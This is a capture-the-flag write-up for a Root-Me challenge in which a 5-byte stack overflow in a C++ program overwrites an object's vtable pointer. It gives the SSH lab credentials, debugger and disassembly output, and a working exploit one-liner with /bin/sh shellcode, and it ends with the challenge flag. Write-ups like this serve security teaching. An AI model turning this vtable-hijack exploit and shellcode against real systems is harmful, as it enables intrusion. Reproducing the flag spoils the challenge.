# ELF x86 - Stack buffer overflow - C++ vtables
https://www.root-me.org/en/Challenges/App-System/ELF-x86-Stack-buffer-overflow-C-vtables
```
Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 Yes 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         Yes 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge20.root-me.org
Protocol	SSH
Port	        2224
SSH access 	ssh -p 2224 app-systeme-ch20@challenge02.root-me.org    
Username	app-systeme-ch20
Password	app-systeme-ch20
```

The vulnerable code is at the function _GetInput_ in _MyStringFormatter_ class:
```c++
#define SIZE (80)
[...snip...]
void GetInput(int padding )  {
  memset(str ,' ' , SIZE  ); 
  fgets(str+padding,SIZE,stdin); 
}
```
The padding can be 1-5 and the user can write up to 80 bytes. The buffer is 80 bytes long, so it's possible to overwrite up to 5 bytes after the buffer ends.<br>
Let's try to do so, and check what did we changed:
```gdb
(gdb) run < <(python -c "print '5\n1\n' + 'A'*75 + 'DDDD'")
Starting program: /challenge/app-systeme/ch20/ch20 < <(python -c "print '5\n1\n' + 'A'*75 + 'DDDD'")
Padding : 1-5


	Convert in : 
	  1: uppercase  
	  2: lowercase  
String to convert: 

Program received signal SIGSEGV, Segmentation fault.
0x08048a0e in MyStringFormatter::display() const ()
```
In fact, the _DDDD_ overwrites the MyStringFormatter object's vtable entry of the _MyStringFormatter::display()_ function. 
So because the SSP is on (so we cannot overwrite the _eip_), and because the _MyStringFormatter::display()_ function is called at the end of the program, we can overwrite its vtable entry and control the _eip_.<br><br>

Here is the _MyStringFormatter::display()_ call:
```asm
   0x08048a02 <+0>:	push   %ebp
   0x08048a03 <+1>:	mov    %esp,%ebp
   0x08048a05 <+3>:	sub    $0x18,%esp
   0x08048a08 <+6>:	mov    0x8(%ebp),%eax
   0x08048a0b <+9>:	mov    0x50(%eax),%eax
   0x08048a0e <+12>:	mov    (%eax),%eax
   0x08048a10 <+14>:	add    $0x8,%eax
   0x08048a13 <+17>:	mov    (%eax),%ecx
   0x08048a15 <+19>:	mov    0x8(%ebp),%edx
   0x08048a18 <+22>:	mov    0x8(%ebp),%eax
   0x08048a1b <+25>:	mov    0x50(%eax),%eax
   0x08048a1e <+28>:	mov    %edx,0x4(%esp)
   0x08048a22 <+32>:	mov    %eax,(%esp)
   0x08048a25 <+35>:	call   *%ecx
   0x08048a27 <+37>:	leave  
   0x08048a28 <+38>:	ret 
```
To sum up:
1. The object (this or self) is moved to _eax_.
2. The vtable of the object is found (at offset 0x50) and is moved to _eax_.
3. The object's _display_ function is found (at instruction +14).
4. The function address is moved to _ecx_ and at the end of the function, there is a call to the address stored in _ecx_ (instruction +35).

<br>
The ASLR and NX are unset. So, it's possible to use the regular shellcode in the stack concept.<br>

1. We'll first jump to the start of the buffer which we can control (0xbffffb45).
2. Then at the start of the buffer we'll put an address to a fake vtable (which will contain an address of a point in the buffer).
3. The fake vtable will contain 1 address to our shellcode.

So it will look like the following diagram:
```
                                  +-----------------+  
        0xbffffb45                |   0xbffffb41    |  
                                  +-----------------+  
        0xbffffb49                |   0xbffffb4d    |  
                                  +-----------------+  
                                  |                 |  
        0xbffffb4d                |    SHELLCODE    |  
                                  |                 |  
                                  +-----------------+  
                                  |       JUNK      |  
                                  +-----------------+  
                                  |   0xbffffb45    |  
                                  +-----------------+
```

Let's try it out:
```sh
app-systeme-ch20@challenge02:~$ cat <(python -c "print '5\n1\n' + '\x41\xfb\xff\xbf' + '\x4d\xfb\xff\xbf' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*39 + '\x45\xfb\xff\xbf'") - | ./ch20 
Padding : 1-5


	Convert in : 
	  1: uppercase  
	  2: lowercase  
String to convert: 
id
uid=1120(app-systeme-ch20) gid=1120(app-systeme-ch20) euid=1220(app-systeme-ch20-cracked) groups=1220(app-systeme-ch20-cracked),100(users),1120(app-systeme-ch20)
cat .passwd
!!FunW1ThVT4bleS!?
```
